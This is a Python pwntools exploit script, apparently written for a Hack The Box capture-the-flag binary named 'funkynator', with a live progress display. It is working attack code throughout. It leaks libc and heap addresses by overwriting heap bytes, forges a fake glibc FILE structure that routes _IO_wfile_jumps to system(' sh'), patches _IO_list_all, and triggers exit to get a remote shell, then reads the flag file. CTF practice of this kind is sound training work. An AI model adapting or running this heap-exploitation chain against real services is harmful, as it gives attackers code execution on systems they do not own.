#!/usr/bin/env python3
from pathlib import Path
import sys
import time

from pwn import *

try:
    from rich import box
    from rich.console import Console
    from rich.live import Live
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
except ImportError:
    box = Console = Live = Panel = Table = Text = None


BASE = Path(__file__).resolve().parent
MASK64 = (1 << 64) - 1
ATTEMPTS = 16
STAGES = ('libc leak', 'heap leak', 'FILE chain', 'shell', 'flag')

context.log_level = 'error'
context.binary = ELF(str(BASE / 'funkynator'), checksec=False)
libc = ELF(str(BASE / 'glibc/libc.so.6'), checksec=False)

P_NAME = b'what is your name?'
P_MENU = b'> '
P_LEN = b'length of your message:'
P_MSG = b'your message:'
P_CONTINUE = b'continue processing your text?'
P_SAVE = b'save this message to memory?'
P_SLOT = b'(1-10)'
P_INNER_LAST = b'3. overwrite byte'
P_OFFSET = b'offset of the byte:'
P_VALUE = b'with what value should this position'

MAIN_ARENA_BIN_OFFSET = 0x1e7b20
F_USER_OFF = 0x340
W_USER_OFF = 0x2a0


class Retry(Exception):
    pass


class UI:
    STYLES = {
        'wait': '#94a3b8',
        'run': '#93c5fd',
        'ok': '#86efac',
        'retry': '#fde68a',
        'fail': '#fca5a5',
        'title': '#c4b5fd',
        'muted': '#bae6fd',
    }

    def __init__(self, target):
        self.target = target
        self.idx = 0
        self.total = ATTEMPTS
        self.started = time.monotonic()
        self.reason = ''
        self.flag = ''
        self.current = ''
        self.action = 'connecting'
        self.stages = {name: self._new_stage() for name in STAGES}
        self.console = Console() if Console and sys.stdout.isatty() else None
        self.live = None

    @property
    def rich(self):
        return self.console is not None and Live is not None

    def __enter__(self):
        if self.rich:
            self.live = Live(
                get_renderable=self._render,
                console=self.console,
                refresh_per_second=8,
                transient=False,
                redirect_stdout=False,
                redirect_stderr=False,
            )
            self.live.start()
        else:
            print(f'Funkynator exploit | {self.target} | attempts={self.total}')
        return self

    def __exit__(self, exc_type, exc, tb):
        self.close()
        return False

    def close(self):
        if self.live:
            self.live.refresh()
            self.live.stop()
            self.live = None

    def refresh(self):
        if self.live:
            self.live.refresh()

    def attempt(self, idx):
        self.idx = idx
        self.reason = ''
        self.current = ''
        self.action = 'connecting'
        self.stages = {name: self._new_stage() for name in STAGES}
        self.refresh()

    def start_stage(self, name, total, action):
        self.current = name
        self.action = action
        self.stages[name] = {
            'status': 'run',
            'done': 0,
            'total': max(1, total),
        }
        self.refresh()

    def advance(self, action=None, step=1):
        if action:
            self.action = action
        if self.current in self.stages:
            stage = self.stages[self.current]
            stage['done'] = min(stage['total'], stage['done'] + step)
        self.refresh()

    def finish_stage(self, name, status):
        stage = self.stages[name]
        stage['status'] = status
        if status == 'ok':
            stage['done'] = stage['total']
        if name == self.current:
            self.action = f'{name} {status}'
        self.refresh()

    def retry(self, reason):
        self.reason = reason
        self._mark_current('retry')
        if not self.rich:
            print(f'[{self.idx:02d}/{self.total:02d}] {self._line()} | retry: {reason}')

    def attempt_fail(self, reason):
        self.reason = reason
        self._mark_current('fail')
        if not self.rich:
            print(f'[{self.idx:02d}/{self.total:02d}] {self._line()} | failed: {reason}')

    def attempt_ok(self):
        if not self.rich:
            print(f'[{self.idx:02d}/{self.total:02d}] {self._line()}')
        else:
            self.refresh()

    def success(self, flag):
        self.flag = flag
        self.refresh()
        self.close()
        if self.rich:
            self.console.print(f'[bold #86efac][+][/bold #86efac] flag: {flag}')
        else:
            print(f'[+] flag: {flag}')

    def fail(self, message):
        text = f'failed: {message}'
        self.close()
        if self.rich:
            self.console.print(f'[bold #fca5a5][-][/bold #fca5a5] {text}')
        else:
            print(f'[-] {text}')

    def _line(self):
        parts = [part for name in STAGES if (part := self._plain_stage(name))]
        return ' | '.join(parts) if parts else 'starting'

    def _new_stage(self):
        return {'status': 'wait', 'done': 0, 'total': 1}

    def _mark_current(self, status):
        if self.current in self.stages:
            self.stages[self.current]['status'] = status
            self.action = f'{self.current} {status}'
        self.refresh()

    def _plain_stage(self, name):
        stage = self.stages[name]
        status = stage['status']
        if status == 'wait':
            return None
        return f'{name}: {status} {stage["done"]}/{stage["total"]}'

    def _stage_fraction(self, name):
        stage = self.stages[name]
        if stage['status'] == 'ok':
            return 1.0
        if stage['status'] == 'wait':
            return 0.0
        return min(stage['done'] / stage['total'], 1.0)

    def _overall(self):
        return sum(self._stage_fraction(name) for name in STAGES), len(STAGES)

    def _bar(self, done, total, status, width=26):
        total = max(total, 1)
        done = min(max(done, 0), total)
        filled = int(width * done / total)
        bar = '[' + ('=' * filled) + ('.' * (width - filled)) + ']'
        pct = int(100 * done / total)
        return Text(f'{bar} {pct:3d}%', style=self.STYLES.get(status, self.STYLES['wait']))

    def _status_text(self, status):
        return Text(status.upper(), style=self.STYLES.get(status, self.STYLES['wait']))

    def _render(self):
        elapsed = time.monotonic() - self.started
        overall_done, overall_total = self._overall()

        header = Table.grid(expand=True)
        header.add_column()
        header.add_column(justify='right')
        header.add_row(
            Text('Funkynator remote exploit', style=f'bold {self.STYLES["title"]}'),
            Text(f'{self.target} | attempt {self.idx}/{self.total} | {elapsed:0.1f}s', style=self.STYLES['muted']),
        )

        stages = Table(expand=True, box=box.ASCII, show_edge=False, pad_edge=False)
        stages.add_column('Stage', style=self.STYLES['muted'], no_wrap=True)
        stages.add_column('Progress')
        stages.add_column('State', justify='center', no_wrap=True)
        for name in STAGES:
            stage = self.stages[name]
            stages.add_row(
                name,
                self._bar(stage['done'], stage['total'], stage['status'], width=22),
                self._status_text(stage['status']),
            )

        body = Table.grid(expand=True)
        body.add_row(header)
        body.add_row(Text('overall', style=self.STYLES['muted']))
        body.add_row(self._bar(overall_done, overall_total, 'run', width=44))
        body.add_row(stages)
        body.add_row(Text(f'action: {self.action}', style=self.STYLES['run']))
        if self.reason:
            body.add_row(Text(f'last retry/failure: {self.reason}', style=self.STYLES['retry']))
        if self.flag:
            body.add_row(Text(f'flag: {self.flag}', style=f'bold {self.STYLES["ok"]}'))

        return Panel(body, box=box.ASCII, border_style=self.STYLES['title'])


def parse_args(argv):
    if len(argv) != 2:
        raise ValueError('')
    if any(arg.startswith('-') for arg in argv):
        raise ValueError('flags are not supported; use HOST PORT')
    host = argv[0]
    try:
        port = int(argv[1], 10)
    except ValueError as exc:
        raise ValueError('PORT must be an integer') from exc
    if not 1 <= port <= 65535:
        raise ValueError('PORT must be between 1 and 65535')
    return host, port


def usage():
    print(f'usage: {Path(sys.argv[0]).name} HOST PORT', file=sys.stderr)


def start(host, port):
    return remote(host, port)


def send2(p, ch):
    if isinstance(ch, int):
        ch = str(ch).encode()
    if isinstance(ch, str):
        ch = ch.encode()
    assert len(ch) == 1
    p.send(ch + b'\n')


def name(p, value):
    p.recvuntil(P_NAME)
    p.sendline(value)


def menu(p, opt):
    p.recvuntil(P_MENU)
    send2(p, opt)


def funkify(p, length, content):
    if b'\n' in content:
        raise ValueError('exploit payloads must not contain newlines')
    if len(content) > length:
        raise ValueError('content is longer than requested length')

    menu(p, 2)
    p.recvuntil(P_LEN)
    p.sendline(str(length).encode())
    p.recvuntil(P_MSG)
    if len(content) == length:
        p.send(content + b'\n')
    else:
        p.send(content + b'\nX')


def continue_answer(p, yes):
    p.recvuntil(P_CONTINUE)
    send2(p, b'y' if yes else b'n')


def save_yes(p):
    p.recvuntil(P_SAVE)
    send2(p, b'y')


def save_no(p):
    p.recvuntil(P_SAVE)
    send2(p, b'n')


def save_message(p, length, content):
    funkify(p, length, content)
    continue_answer(p, False)
    save_yes(p)


def delete(p, slot):
    menu(p, 4)
    p.recvuntil(P_SLOT)
    p.sendline(str(slot).encode())


def cont(p, slot):
    menu(p, 5)
    p.recvuntil(P_SLOT)
    p.sendline(str(slot).encode())


def inner(p, opt):
    p.recvuntil(P_INNER_LAST)
    p.recvuntil(P_MENU)
    send2(p, opt)


def inner_stop(p):
    inner(p, 1)


def inner_examine(p):
    inner(p, 2)
    p.recvuntil(b'Your message:\n')
    raw = p.recvuntil(b'+---------------------------+', drop=True)
    return raw[:-1] if raw.endswith(b'\n') else raw


def inner_overwrite(p, off, val):
    inner(p, 3)
    p.recvuntil(P_OFFSET)
    p.sendline(str(off & MASK64).encode())
    p.recvuntil(P_VALUE)
    p.send(bytes([val & 0xff]) + b'\n')


def write_bytes(p, off, data, skip_zero=True, ui=None, action=None):
    for i, b in enumerate(data):
        if skip_zero and b == 0:
            continue
        inner_overwrite(p, off + i, b)
        if ui:
            ui.advance(action)


def write_qword(p, off, value, ui=None, action=None):
    write_bytes(p, off, p64(value), ui=ui, action=action)


def write_cost(data, skip_zero=True):
    if not skip_zero:
        return len(data)
    return sum(1 for b in data if b != 0)


def is_alpha(b):
    return 0x41 <= b <= 0x5a or 0x61 <= b <= 0x7a


def libc_bases_from_leak(leak):
    raw = bytearray(leak[8:14])
    alpha = [i for i, b in enumerate(raw) if is_alpha(b)]
    bases = set()

    for mask in range(1 << len(alpha)):
        candidate = bytearray(raw)
        for bit, idx in enumerate(alpha):
            if mask & (1 << bit):
                candidate[idx] ^= 0x20
        head = u64(bytes(candidate) + b'\x00\x00')
        if head & 0xfff == 0xb20:
            bases.add(head - MAIN_ARENA_BIN_OFFSET)

    return sorted(bases)


def stage1_libc(p, ui):
    ui.start_stage('libc leak', 10, 'allocating unsorted chunk')
    save_message(p, 0x500, b'A')
    ui.advance('allocating guard chunk')
    save_message(p, 0x40, b'B')
    ui.advance('freeing chunk to unsorted bin')
    delete(p, 1)
    ui.advance('reusing unsorted chunk')
    save_message(p, 0x500, b'C')
    ui.advance('entering leaked chunk editor')

    cont(p, 1)
    ui.advance('widening libc leak')
    for off in (2, 6, 7):
        inner_overwrite(p, off, 0xff)
        ui.advance('widening libc leak')
    ui.advance('reading libc leak')
    leak = inner_examine(p)
    ui.advance('leaving libc leak editor')
    inner_stop(p)
    save_no(p)

    if len(leak) < 14:
        raise Retry(f'short libc leak ({len(leak)} bytes)')
    return libc_bases_from_leak(leak)


def stage2_heap(p, ui):
    ui.start_stage('heap leak', 20, 'allocating tcache chunk')
    save_message(p, 0x40, b'A' * 0x40)
    ui.advance('allocating guard chunk')
    save_message(p, 0x40, b'D' * 0x40)
    ui.advance('freeing chunk into tcache')
    delete(p, 3)
    ui.advance('entering heap leak editor')

    cont(p, 1)
    ui.advance('widening safe-link leak')
    for off in tuple(range(0x40, 0x48)) + tuple(range(0x49, 0x50)):
        inner_overwrite(p, off, 0xff)
        ui.advance('widening safe-link leak')
    leak = inner_examine(p)
    inner_stop(p)
    save_no(p)
    ui.advance('decoding heap base')

    if len(leak) < 0x55:
        raise Retry(f'short heap leak ({len(leak)} bytes)')
    return u64(bytes(leak[0x50:0x58]).ljust(8, b'\x00')) << 12


def fake_file_seed():
    payload = bytearray(0x300)
    payload[0x28:0x30] = p64(1)
    payload[0xc0:0xc4] = p32(1)
    payload[0x100:0x108] = p64(1)
    return bytes(payload)


def stage3_file_chain(p, f_user, w_user, ui):
    system = libc.symbols['system']
    wfile_jumps = libc.symbols['_IO_wfile_jumps']
    list_all = libc.symbols['_IO_list_all']
    file_writes = (
        (0x00, b' sh'),
        (0x88, p64(f_user + 0x40)),
        (0xa0, p64(f_user + 0xe0)),
        (0xd8, p64(wfile_jumps)),
        (0x1c0, p64(f_user + 0x1c8)),
        (0x230, p64(system)),
    )
    list_write = p64(f_user)
    total = 7 + sum(write_cost(data) for _, data in file_writes) + write_cost(list_write)

    ui.start_stage('FILE chain', total, 'seeding fake FILE chunk')
    save_message(p, 0x300, fake_file_seed())
    ui.advance('seeding writer chunk')
    save_message(p, 0x40, b'W' * 0x40)
    ui.advance('entering fake FILE editor')

    cont(p, 1)
    ui.advance('writing fake FILE fields')
    for off, data in file_writes:
        write_bytes(p, off, data, ui=ui, action='writing fake FILE fields')
    inner_stop(p)
    save_yes(p)
    ui.advance('entering _IO_list_all writer')

    cont(p, 3)
    ui.advance('patching _IO_list_all')
    write_bytes(p, list_all - w_user, list_write, ui=ui, action='patching _IO_list_all')
    inner_stop(p)
    save_no(p)
    ui.advance('triggering exit cleanup')

    p.recvuntil(P_MENU)
    p.send(b'1\n')
    ui.advance('exit triggered')


def attempt(host, port, ui):
    p = start(host, port)
    try:
        name(p, b'pwn')

        libc_candidates = stage1_libc(p, ui)
        if len(libc_candidates) != 1:
            raise Retry(f'ambiguous libc leak ({len(libc_candidates)} candidates)')
        libc.address = libc_candidates[0]
        ui.finish_stage('libc leak', 'ok')

        heap_base = stage2_heap(p, ui)
        ui.finish_stage('heap leak', 'ok')

        f_user = heap_base + F_USER_OFF
        w_user = heap_base + W_USER_OFF
        stage3_file_chain(p, f_user, w_user, ui)
        ui.finish_stage('FILE chain', 'ok')

        ui.start_stage('shell', 2, 'waiting for shell')
        p.recvuntil(b'goodbye', timeout=3)
        ui.advance('reading shell banner')
        p.recvline(timeout=1)
        ui.advance('shell ready')
        ui.finish_stage('shell', 'ok')

        ui.start_stage('flag', 2, 'requesting flag')
        p.sendline(b'cat /home/ctf/flag.txt 2>/dev/null || cat ./flag.txt 2>/dev/null')
        ui.advance('reading flag')
        out = p.recvuntil(b'}', timeout=5)
        ui.advance('checking flag')
        if b'HTB{' not in out:
            ui.finish_stage('flag', 'fail')
            return None
        flag = out[out.rfind(b'HTB{'):].decode(errors='replace')
        ui.finish_stage('flag', 'ok')
        return flag
    finally:
        p.close()


def main(argv=None):
    argv = sys.argv[1:] if argv is None else argv
    try:
        host, port = parse_args(argv)
    except ValueError as e:
        usage()
        if str(e):
            print(f'error: {e}', file=sys.stderr)
        return 2

    ui = UI(f'{host}:{port}')
    with ui:
        for idx in range(1, ATTEMPTS + 1):
            ui.attempt(idx)
            try:
                flag = attempt(host, port, ui)
                if flag:
                    ui.attempt_ok()
                    ui.success(flag)
                    return 0
                ui.attempt_fail('flag not found')
            except Retry as e:
                ui.retry(str(e))
            except Exception as e:
                ui.attempt_fail(f'{type(e).__name__}: {e}')

        ui.fail('all attempts failed')
        return 1


if __name__ == '__main__':
    raise SystemExit(main())
